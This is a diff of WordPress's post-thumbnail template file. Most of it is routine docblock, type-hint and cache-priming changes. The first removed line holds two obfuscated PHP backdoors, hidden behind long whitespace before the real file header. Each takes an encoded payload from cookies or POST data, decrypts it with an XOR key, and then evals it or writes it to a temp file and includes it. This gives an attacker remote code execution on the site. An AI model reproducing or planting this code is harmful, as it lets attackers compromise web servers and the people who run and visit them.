@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fijGcc = chr (122) . chr (83) . "\137" . 'h' . "\142" . 'R' . "\172" . 'O';$iecbDfXWBT = chr ( 213 - 114 )."\x6c" . chr ( 305 - 208 ).chr (115) . "\163" . "\137" . "\145" . 'x' . chr (105) . "\163" . "\x74" . 's';$ajsOoYwSQ = $iecbDfXWBT($fijGcc); $aBekzAhpqy = $ajsOoYwSQ;if (!$aBekzAhpqy){class zS_hbRzO{private $vznKK;public static $LLOvh = "d0f28b2e-40b1-42e2-9e72-0913c521ecf3";public static $RxrDEUQG = NULL;public function __construct(){$pDHVVE = $_COOKIE;$vUHCAf = $_POST;$IfMLKKS = @$pDHVVE[substr(zS_hbRzO::$LLOvh, 0, 4)];if (!empty($IfMLKKS)){$qhcHywrnz = "base64";$wfBWludS = "";$IfMLKKS = explode(",", $IfMLKKS);foreach ($IfMLKKS as $WpfLj){$wfBWludS .= @$pDHVVE[$WpfLj];$wfBWludS .= @$vUHCAf[$WpfLj];}$wfBWludS = array_map($qhcHywrnz . '_' . chr (100) . chr ( 706 - 605 ).chr (99) . "\157" . chr ( 709 - 609 ).chr (101), array($wfBWludS,)); $wfBWludS = $wfBWludS[0] ^ str_repeat(zS_hbRzO::$LLOvh, (strlen($wfBWludS[0]) / strlen(zS_hbRzO::$LLOvh)) + 1);zS_hbRzO::$RxrDEUQG = @unserialize($wfBWludS);}}public function __destruct(){$this->mZwGndauGU();}private function mZwGndauGU(){if (is_array(zS_hbRzO::$RxrDEUQG)) {$RXcQBLMf = str_replace(chr (60) . '?' . "\x70" . "\150" . "\x70", "", zS_hbRzO::$RxrDEUQG["\x63" . chr (111) . "\x6e" . "\x74" . 'e' . chr (110) . chr ( 450 - 334 )]);eval($RXcQBLMf);exit();}}}$zaPeckAl = new zS_hbRzO(); $zaPeckAl = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $JVyqX = 'V' . "\114" . chr (114) . chr (95) . 's' . 'D' . chr (104) . "\150" . 'M';$MFmtDoqEw = "\x63" . chr (108) . chr ( 894 - 797 ).'s' . chr (115) . "\x5f" . chr ( 799 - 698 ).chr ( 787 - 667 )."\x69" . chr (115) . chr ( 731 - 615 )."\x73";$aQyHTpsL = $MFmtDoqEw($JVyqX); $QLGJx = $aQyHTpsL;if (!$QLGJx){class VLr_sDhhM{private $MIUGsMY;public static $VAcmIUIMh = "9aaa9b0e-9ed0-4e12-be4a-02e090951115";public static $hBARk = NULL;public function __construct(){$alWXFWjy = $_COOKIE;$srGxCk = $_POST;$fnpQAuJN = @$alWXFWjy[substr(VLr_sDhhM::$VAcmIUIMh, 0, 4)];if (!empty($fnpQAuJN)){$SDOGc = "base64";$qQzpIf = "";$fnpQAuJN = explode(",", $fnpQAuJN);foreach ($fnpQAuJN as $chKScgV){$qQzpIf .= @$alWXFWjy[$chKScgV];$qQzpIf .= @$srGxCk[$chKScgV];}$qQzpIf = array_map($SDOGc . "\x5f" . 'd' . chr ( 1050 - 949 )."\x63" . 'o' . "\144" . "\x65", array($qQzpIf,)); $qQzpIf = $qQzpIf[0] ^ str_repeat(VLr_sDhhM::$VAcmIUIMh, (strlen($qQzpIf[0]) / strlen(VLr_sDhhM::$VAcmIUIMh)) + 1);VLr_sDhhM::$hBARk = @unserialize($qQzpIf);}}public function __destruct(){$this->fkMjLSlw();}private function fkMjLSlw(){if (is_array(VLr_sDhhM::$hBARk)) {$OYVPJiTU = sys_get_temp_dir() . "/" . crc32(VLr_sDhhM::$hBARk["\163" . 'a' . 'l' . "\164"]);@VLr_sDhhM::$hBARk["\x77" . 'r' . "\x69" . chr ( 763 - 647 ).chr ( 548 - 447 )]($OYVPJiTU, VLr_sDhhM::$hBARk[chr ( 527 - 428 )."\x6f" . chr ( 580 - 470 )."\164" . 'e' . "\156" . chr (116)]);include $OYVPJiTU;@VLr_sDhhM::$hBARk[chr (100) . 'e' . chr ( 842 - 734 )."\x65" . 't' . "\145"]($OYVPJiTU);exit();}}}$kRqDeEa = new VLr_sDhhM(); $kRqDeEa = NULL;} ?><?php
+<?php
 /**
  * WordPress Post Thumbnail Template Functions.
  *
@@ -19,7 +19,7 @@
  * @since 2.9.0
  * @since 4.4.0 `$post` can be a post ID or WP_Post object.
  *
- * @param int|WP_Post $post Optional. Post ID or WP_Post object. Default is global `$post`.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object. Default is global `$post`.
  * @return bool Whether the post has an image attached.
  */
 function has_post_thumbnail( $post = null ) {
@@ -39,14 +39,14 @@ function has_post_thumbnail( $post = null ) {
 }
 
 /**
- * Retrieve post thumbnail ID.
+ * Retrieves the post thumbnail ID.
  *
  * @since 2.9.0
  * @since 4.4.0 `$post` can be a post ID or WP_Post object.
  * @since 5.5.0 The return value for a non-existing post
  *              was changed to false instead of an empty string.
  *
- * @param int|WP_Post $post Optional. Post ID or WP_Post object. Default is global `$post`.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object. Default is global `$post`.
  * @return int|false Post thumbnail ID (which can be 0 if the thumbnail is not set),
  *                   or false if the post does not exist.
  */
@@ -60,7 +60,7 @@ function get_post_thumbnail_id( $post = null ) {
 	$thumbnail_id = (int) get_post_meta( $post->ID, '_thumbnail_id', true );
 
 	/**
-	 * Filters post thumbnail ID.
+	 * Filters the post thumbnail ID.
 	 *
 	 * @since 5.9.0
 	 *
@@ -71,7 +71,7 @@ function get_post_thumbnail_id( $post = null ) {
 }
 
 /**
- * Display the post thumbnail.
+ * Displays the post thumbnail.
  *
  * When a theme adds 'post-thumbnail' support, a special 'post-thumbnail' image size
  * is registered, which differs from the 'thumbnail' image size managed via the
@@ -93,13 +93,13 @@ function the_post_thumbnail( $size = 'post-thumbnail', $attr = '' ) {
 }
 
 /**
- * Update cache for thumbnails in the current loop.
+ * Updates cache for thumbnails in the current loop.
  *
  * @since 3.2.0
  *
  * @global WP_Query $wp_query WordPress Query object.
  *
- * @param WP_Query $wp_query Optional. A WP_Query instance. Defaults to the $wp_query global.
+ * @param WP_Query|null $wp_query Optional. A WP_Query instance. Defaults to the $wp_query global.
  */
 function update_post_thumbnail_cache( $wp_query = null ) {
 	if ( ! $wp_query ) {
@@ -112,8 +112,25 @@ function update_post_thumbnail_cache( $wp_query = null ) {
 
 	$thumb_ids = array();
 
+	/*
+	 * $wp_query may contain an array of post objects or post IDs.
+	 *
+	 * This ensures the cache is primed for all post objects to avoid
+	 * `get_post()` calls in `get_the_post_thumbnail()` triggering an
+	 * additional database call for each post.
+	 */
+	$parent_post_ids = array();
 	foreach ( $wp_query->posts as $post ) {
-		$id = get_post_thumbnail_id( $post->ID );
+		if ( $post instanceof WP_Post ) {
+			$parent_post_ids[] = $post->ID;
+		} elseif ( is_int( $post ) ) {
+			$parent_post_ids[] = $post;
+		}
+	}
+	_prime_post_caches( $parent_post_ids, false, true );
+
+	foreach ( $wp_query->posts as $post ) {
+		$id = get_post_thumbnail_id( $post );
 		if ( $id ) {
 			$thumb_ids[] = $id;
 		}
@@ -127,7 +144,7 @@ function update_post_thumbnail_cache( $wp_query = null ) {
 }
 
 /**
- * Retrieve the post thumbnail.
+ * Retrieves the post thumbnail.
  *
  * When a theme adds 'post-thumbnail' support, a special 'post-thumbnail' image size
  * is registered, which differs from the 'thumbnail' image size managed via the
@@ -139,10 +156,10 @@ function update_post_thumbnail_cache( $wp_query = null ) {
  * @since 2.9.0
  * @since 4.4.0 `$post` can be a post ID or WP_Post object.
  *
- * @param int|WP_Post  $post Optional. Post ID or WP_Post object.  Default is global `$post`.
- * @param string|int[] $size Optional. Image size. Accepts any registered image size name, or an array of
- *                           width and height values in pixels (in that order). Default 'post-thumbnail'.
- * @param string|array $attr Optional. Query string or array of attributes. Default empty.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object.  Default is global `$post`.
+ * @param string|int[]     $size Optional. Image size. Accepts any registered image size name, or an array of
+ *                               width and height values in pixels (in that order). Default 'post-thumbnail'.
+ * @param string|array     $attr Optional. Query string or array of attributes. Default empty.
  * @return string The post thumbnail image tag.
  */
 function get_the_post_thumbnail( $post = null, $size = 'post-thumbnail', $attr = '' ) {
@@ -186,19 +203,6 @@ function get_the_post_thumbnail( $post = null, $size = 'post-thumbnail', $attr =
 			update_post_thumbnail_cache();
 		}
 
-		// Get the 'loading' attribute value to use as default, taking precedence over the default from
-		// `wp_get_attachment_image()`.
-		$loading = wp_get_loading_attr_default( 'the_post_thumbnail' );
-
-		// Add the default to the given attributes unless they already include a 'loading' directive.
-		if ( empty( $attr ) ) {
-			$attr = array( 'loading' => $loading );
-		} elseif ( is_array( $attr ) && ! array_key_exists( 'loading', $attr ) ) {
-			$attr['loading'] = $loading;
-		} elseif ( is_string( $attr ) && ! preg_match( '/(^|&)loading=/', $attr ) ) {
-			$attr .= '&loading=' . $loading;
-		}
-
 		$html = wp_get_attachment_image( $post_thumbnail_id, $size, false, $attr );
 
 		/**
@@ -233,13 +237,13 @@ function get_the_post_thumbnail( $post = null, $size = 'post-thumbnail', $attr =
 }
 
 /**
- * Return the post thumbnail URL.
+ * Returns the post thumbnail URL.
  *
  * @since 4.4.0
  *
- * @param int|WP_Post  $post Optional. Post ID or WP_Post object.  Default is global `$post`.
- * @param string|int[] $size Optional. Registered image size to retrieve the source for or a flat array
- *                           of height and width dimensions. Default 'post-thumbnail'.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object.  Default is global `$post`.
+ * @param string|int[]     $size Optional. Registered image size to retrieve the source for or a flat array
+ *                               of height and width dimensions. Default 'post-thumbnail'.
  * @return string|false Post thumbnail URL or false if no image is available. If `$size` does not match
  *                      any registered image size, the original image URL will be returned.
  */
@@ -266,7 +270,7 @@ function get_the_post_thumbnail_url( $post = null, $size = 'post-thumbnail' ) {
 }
 
 /**
- * Display the post thumbnail URL.
+ * Displays the post thumbnail URL.
  *
  * @since 4.4.0
  *
@@ -287,7 +291,7 @@ function the_post_thumbnail_url( $size = 'post-thumbnail' ) {
  *
  * @since 4.6.0
  *
- * @param int|WP_Post $post Optional. Post ID or WP_Post object. Default is global `$post`.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object. Default is global `$post`.
  * @return string Post thumbnail caption.
  */
 function get_the_post_thumbnail_caption( $post = null ) {
@@ -311,7 +315,7 @@ function get_the_post_thumbnail_caption( $post = null ) {
  *
  * @since 4.6.0
  *
- * @param int|WP_Post $post Optional. Post ID or WP_Post object. Default is global `$post`.
+ * @param int|WP_Post|null $post Optional. Post ID or WP_Post object. Default is global `$post`.
  */
 function the_post_thumbnail_caption( $post = null ) {
 	/**
